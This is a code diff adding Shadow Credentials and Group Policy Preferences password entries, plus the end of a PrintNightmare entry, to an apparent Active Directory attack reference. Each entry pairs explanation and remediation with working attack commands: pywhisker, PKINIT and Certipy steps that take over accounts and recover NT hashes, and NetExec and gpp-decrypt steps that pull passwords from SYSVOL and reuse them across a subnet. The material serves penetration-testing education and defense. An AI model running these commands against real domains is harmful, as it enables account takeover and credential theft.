+            { label: "The Hacker Recipes — PrintNightmare", url: "https://www.thehacker.recipes/ad/movement/print-spooler-service/printnightmare" },
+            { label: "Microsoft — CVE-2021-34527", url: "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527" }
+          ]},
+          { title: "Remediation", type: "notes", items: [
+            "Apply the Microsoft patches for CVE-2021-1675 and CVE-2021-34527.",
+            "Disable the Print Spooler service entirely on systems that do not print — especially domain controllers and servers.",
+            "Restrict Point-and-Print with the RestrictDriverInstallationToAdministrators registry setting so only admins can install drivers.",
+            "Where the Spooler is required, limit which servers it can fetch drivers from (PackagePointAndPrintServerList) and monitor for anomalous driver installs."
+          ]}
+        ]
+      },
+      {
+        id: "shadow-credentials",
+        name: "Shadow Credentials (msDS-KeyCredentialLink)",
+        severity: "High",
+        ref: "https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials",
+        theory: "theory/2026-09-24-shadow-credentials-pkinit.html",
+        description: "With write access to a target account, an attacker adds a key credential and authenticates via PKINIT to take over the account and recover its NT hash.",
+        brief: "Shadow Credentials abuse the msDS-KeyCredentialLink attribute, which stores public keys used for Windows Hello for Business / Key Trust certificate-based authentication (PKINIT). If an attacker has write access over a target user or computer object — GenericWrite, GenericAll, WriteProperty on that attribute, or an equivalent delegated right (often found via BloodHound) — they can add their own key credential to the target's msDS-KeyCredentialLink.\n\nWith that key in place, the attacker performs a PKINIT Kerberos authentication as the target using the matching certificate, obtaining a TGT. The returned PAC can then be used to recover the target account's NT hash (the 'UnPAC-the-hash' technique). The result is full takeover of the target account without ever knowing or resetting its password — and it is stealthy and persistent, since it adds a credential rather than changing one.\n\nIt requires a domain functional level that supports PKINIT with a KDC that has a certificate (typically AD CS present, or Key Trust configured), and is a common escalation step once an ACL write primitive is found.",
+        quickReference: [
+          { label: "Add a shadow credential (pywhisker)", cmd: "pywhisker.py -d corp.local -u attacker -p pass --target victim --action add" },
+          { label: "PKINIT with the cert for a TGT", cmd: "gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass <pw> corp.local/victim victim.ccache" },
+          { label: "Certipy one-shot", cmd: "certipy shadow auto -u attacker@corp.local -p pass -account victim" },
+          { label: "Precondition", cmd: "Write over the target (GenericWrite/GenericAll/AddKeyCredentialLink) + a KDC cert / AD CS" }
+        ],
+        sections: [
+          { title: "Root Cause", type: "notes", items: [
+            "msDS-KeyCredentialLink holds public key credentials trusted for PKINIT (certificate) logon; anyone who can write that attribute can register their own key for the account.",
+            "PKINIT then lets the attacker authenticate as the target with the matching certificate and receive a TGT — no password needed.",
+            "The TGT's PAC can be decrypted to recover the account's NT hash (UnPAC-the-hash), giving reusable credentials.",
+            "Because it ADDS a credential rather than changing the password, it is quiet and survives until the attribute is cleaned up — a persistence as well as escalation technique."
+          ]},
+          { title: "Preconditions", type: "notes", items: [
+            "A write primitive over the target object: GenericWrite, GenericAll, WriteProperty on msDS-KeyCredentialLink, or AddKeyCredentialLink (frequently surfaced by BloodHound).",
+            "A KDC able to perform PKINIT — in practice AD CS deployed (a KDC/enrolment certificate) or Key Trust configured.",
+            "Domain controllers running Windows Server 2016 or later."
+          ]},
+          { title: "Exploitation", type: "commands", commands: [
+            { label: "1. Add the key credential", cmd: "pywhisker.py -d corp.local -u attacker -p 'Passw0rd' \\\n  --target victim --action add\n# outputs a PFX and its password" },
+            { label: "2. PKINIT to get a TGT", cmd: "gettgtpkinit.py -cert-pfx victim.pfx -pfx-pass <pw> \\\n  corp.local/victim victim.ccache" },
+            { label: "3. UnPAC-the-hash to recover the NT hash", cmd: "export KRB5CCNAME=victim.ccache\ngetnthash.py -key <AS-REP-key-from-step2> corp.local/victim" },
+            { label: "Or do it all with Certipy", cmd: "certipy shadow auto -u attacker@corp.local -p pass -account victim\n# adds the key, authenticates, and prints the NT hash, then cleans up" },
+            { label: "4. Clean up the attribute", cmd: "pywhisker.py ... --action clear   # remove the planted key credential" }
+          ]},
+          { title: "Impact & Attack Chain", type: "table", columns: ["Step", "Action", "Result"], rows: [
+            ["1", "Find a write primitive over the target (BloodHound)", "AddKeyCredentialLink capability"],
+            ["2", "Add a key to msDS-KeyCredentialLink", "Attacker-controlled PKINIT credential on the account"],
+            ["3", "PKINIT authenticate as the target", "TGT for the target account"],
+            ["4", "UnPAC-the-hash", "Target's NT hash recovered"],
+            ["5", "Pass-the-hash / further escalation", "Full account takeover, persistence"]
+          ]},
+          { title: "Tools Used", type: "table", columns: ["Tool", "Purpose"], rows: [
+            ["pyWhisker / Whisker", "Add, list, and clear msDS-KeyCredentialLink entries"],
+            ["Certipy (shadow)", "One-shot add + PKINIT + NT-hash recovery"],
+            ["PKINITtools (gettgtpkinit, getnthash)", "PKINIT authentication and UnPAC-the-hash"],
+            ["BloodHound", "Find the ACL write primitive that enables the attack"]
+          ]},
+          { title: "References", type: "references", items: [
+            { label: "The Hacker Recipes — Shadow Credentials", url: "https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials" },
+            { label: "SpecterOps — Shadow Credentials research", url: "https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab" }
+          ]},
+          { title: "Remediation", type: "notes", items: [
+            "Audit and tighten ACLs so only intended principals can write msDS-KeyCredentialLink or hold GenericWrite/GenericAll over accounts (review with BloodHound).",
+            "Monitor directory changes to msDS-KeyCredentialLink (it should rarely change outside legitimate Windows Hello enrolment).",
+            "Protect AD CS and the KDC certificate, since PKINIT depends on them (see AD CS misconfigurations).",
+            "Place high-value accounts in Protected Users / tier-0 isolation and alert on PKINIT authentications for them."
+          ]}
+        ]
+      },
       {
         id: "dsrm-persistence",
         name: "DSRM Administrator Persistence",
@@ -4742,6 +5147,62 @@ var VULNS = [
   {
     category: "Credential Access",
     vulns: [
+      {
+        id: "gpp-passwords",
+        name: "Group Policy Preferences Passwords (cPassword, MS14-025)",
+        severity: "High",
+        ref: "https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policy-preferences",
+        description: "Legacy Group Policy Preferences stored credentials in SYSVOL encrypted with a published, static key that any domain user can decrypt.",
+        brief: "Group Policy Preferences (GPP) let administrators push settings — including local accounts, scheduled tasks, mapped drives, and services — to domain machines. When a password was set in one of these preferences, it was stored in an XML file (Groups.xml, Services.xml, ScheduledTasks.xml, Drives.xml, DataSources.xml) in the domain's SYSVOL share, in a cpassword attribute encrypted with AES-256.\n\nThe fatal flaw is that Microsoft published the static AES key in MSDN documentation, so the encryption is reversible by anyone. Because SYSVOL is readable by every authenticated domain user, any domain account can read these XML files and instantly decrypt the cpassword to recover a cleartext password — very often a local administrator password reused across many machines, giving immediate lateral movement.\n\nMicrosoft removed the ability to set new GPP passwords in MS14-025 (2014), but it did not delete existing ones, so these files still linger in many mature domains and remain a reliable, high-value credential source.",
+        quickReference: [
+          { label: "Find & decrypt from SYSVOL (netexec)", cmd: "nxc smb <dc> -u user -p pass -M gpp_password" },
+          { label: "Pull from SYSVOL (pyGPPPass)", cmd: "Get-GPPPassword.py 'CORP/user:pass@<dc>'" },
+          { label: "Manual: grep SYSVOL then decrypt", cmd: "findstr /S /I cpassword \\\\<dc>\\SYSVOL\\<domain>\\Policies\\*.xml" },
+          { label: "Decrypt a captured cpassword", cmd: "gpp-decrypt <base64-cpassword>" }
+        ],
+        sections: [
+          { title: "Root Cause", type: "notes", items: [
+            "GPP passwords are stored in SYSVOL XML files in a cpassword attribute, encrypted with AES-256.",
+            "Microsoft published the static AES key in its documentation, so the ciphertext is trivially reversible by anyone who reads the file.",
+            "SYSVOL is readable by all authenticated domain users, so no special access is needed to retrieve the XML.",
+            "MS14-025 stopped new GPP passwords being created but did not remove existing ones, so legacy entries persist for years."
+          ]},
+          { title: "Where to Look", type: "notes", items: [
+            "SYSVOL policy files: \\\\<dc>\\SYSVOL\\<domain>\\Policies\\{GUID}\\Machine|User\\Preferences\\...",
+            "Groups.xml (local accounts), Services.xml, ScheduledTasks.xml, Drives.xml, DataSources.xml, Printers.xml.",
+            "Any readable file share or backup that mirrors old SYSVOL content.",
+            "Decrypted passwords are frequently reused local-admin credentials — test them widely with NetExec."
+          ]},
+          { title: "Exploitation", type: "commands", commands: [
+            { label: "Automated (NetExec)", cmd: "nxc smb <dc> -u user -p pass -M gpp_password\n# locates the XML in SYSVOL and prints the decrypted password" },
+            { label: "Automated (Impacket-style)", cmd: "Get-GPPPassword.py 'CORP/user:pass@<dc>'" },
+            { label: "Manual retrieval + decrypt", cmd: "# find the ciphertext:\nfindstr /S /I cpassword \\\\<dc>\\SYSVOL\\corp.local\\Policies\\*.xml\n# decrypt it:\ngpp-decrypt 'j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw'" },
+            { label: "Reuse the recovered creds", cmd: "nxc smb 10.0.0.0/24 -u 'LocalAdmin' -p '<recovered>' --local-auth" }
+          ]},
+          { title: "Impact & Attack Chain", type: "table", columns: ["Step", "Action", "Result"], rows: [
+            ["1", "Authenticate as any domain user", "Read access to SYSVOL"],
+            ["2", "Find cpassword in policy XML", "Encrypted credential located"],
+            ["3", "Decrypt with the public static key", "Cleartext password recovered"],
+            ["4", "Reuse the (often local-admin) password", "Lateral movement across the domain"]
+          ]},
+          { title: "Tools Used", type: "table", columns: ["Tool", "Purpose"], rows: [
+            ["NetExec (gpp_password module)", "Find and decrypt GPP passwords from SYSVOL"],
+            ["Get-GPPPassword", "Retrieve and decrypt the cpassword values"],
+            ["gpp-decrypt", "Decrypt a captured cpassword string"],
+            ["NetExec (spray)", "Test the recovered credentials across the network"]
+          ]},
+          { title: "References", type: "references", items: [
+            { label: "The Hacker Recipes — GPP Passwords", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/group-policy-preferences" },
+            { label: "Microsoft — MS14-025", url: "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025" }
+          ]},
+          { title: "Remediation", type: "notes", items: [
+            "Apply MS14-025 and, crucially, delete any existing GPP password XML files from SYSVOL — the patch does not remove old ones.",
+            "Search SYSVOL for cpassword across all policies and remediate every hit; rotate any password that was exposed.",
+            "Use LAPS for local administrator passwords instead of pushing a shared password via GPP.",
+            "Restrict and monitor SYSVOL for sensitive content, and avoid storing any secret in Group Policy Preferences."
+          ]}
+        ]
+      },
       {
         id: "lsass-dumping",
         name: "LSASS Memory Dumping",
